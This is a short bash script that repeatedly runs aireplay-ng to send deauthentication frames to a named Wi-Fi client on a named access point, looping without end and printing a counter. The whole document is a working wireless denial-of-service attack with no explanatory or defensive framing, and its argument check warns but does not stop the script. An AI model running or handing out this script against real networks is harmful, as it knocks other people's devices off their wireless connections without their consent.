#!/bin/bash

if [ "$#" -lt 4 ]; then
    echo usage: $0 SSID BASE_MAC STA_MAC IF
fi

i=0;
while true; do
      sudo aireplay-ng $4 --deauth 5 -e $1 -h $2 -c $3 > /dev/null;
      i=$(($i+1))
      echo $i;
done
